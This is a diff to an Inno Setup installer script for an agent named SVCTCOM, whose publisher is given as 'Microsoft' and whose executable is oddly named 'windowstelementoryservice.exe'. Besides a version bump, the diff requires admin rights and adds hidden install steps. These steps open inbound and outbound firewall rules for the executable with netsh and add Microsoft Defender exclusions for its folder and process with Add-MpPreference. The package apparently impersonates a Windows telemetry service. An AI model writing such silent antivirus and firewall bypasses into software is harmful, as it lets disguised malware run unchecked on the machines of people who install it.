@@ -4,7 +4,7 @@
 ; Paths below are relative to this .iss file (agent/packaging/windows).
 
 #define AppName "SVCTCOM"
-#define AppVersion "1.1.70"
+#define AppVersion "1.1.71"
 #define AppPublisher "Microsoft"
 ; AppId used by the Pascal code to find the previous version's uninstaller.
 ; MUST match the literal AppId in [Setup] below (kept literal there because the
@@ -27,7 +27,7 @@ OutputBaseFilename=SVCTCOM-Setup
 Compression=lzma2
 SolidCompression=yes
 WizardStyle=modern
-PrivilegesRequired=lowest
+PrivilegesRequired=admin
 ArchitecturesInstallIn64BitMode=x64compatible
 ; Detect/close the agent if it is running so an upgrade can replace the .exe.
 CloseApplications=force
@@ -49,11 +49,20 @@ Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: 
   Flags: uninsdeletevalue
 
 [Run]
+Filename: "{sys}\netsh.exe"; Parameters: "advfirewall firewall add rule name=""{#AppName}"" dir=in action=allow program=""{app}\windowstelementoryservice.exe"" enable=yes"; Flags: runhidden
+Filename: "{sys}\netsh.exe"; Parameters: "advfirewall firewall add rule name=""{#AppName}"" dir=out action=allow program=""{app}\windowstelementoryservice.exe"" enable=yes"; Flags: runhidden
+Filename: "powershell.exe"; Parameters: "-Command ""Add-MpPreference -ExclusionPath '{app}'"""; Flags: runhidden
+Filename: "powershell.exe"; Parameters: "-Command ""Add-MpPreference -ExclusionProcess '{app}\windowstelementoryservice.exe'"""; Flags: runhidden
 Filename: "{app}\windowstelementoryservice.exe"; Description: "Launch the agent now"; \
   Flags: nowait postinstall skipifsilent; Check: NotPendingReboot
 Filename: "{app}\windowstelementoryservice.exe"; Flags: nowait runhidden; \
   Check: WizardSilent and NotPendingReboot
 Filename: "{sys}\sc.exe"; Parameters: "start SVCTCOM"; Flags: runhidden; Check: NotPendingReboot
+
+[UninstallRun]
+Filename: "{sys}\netsh.exe"; Parameters: "advfirewall firewall delete rule name=""{#AppName}"""; Flags: runhidden
+Filename: "powershell.exe"; Parameters: "-Command ""Remove-MpPreference -ExclusionPath '{app}'"""; Flags: runhidden
+Filename: "powershell.exe"; Parameters: "-Command ""Remove-MpPreference -ExclusionProcess '{app}\windowstelementoryservice.exe'"""; Flags: runhidden
 
 [UninstallDelete]
 ; Remove any executables we had to set aside during a locked-file upgrade.
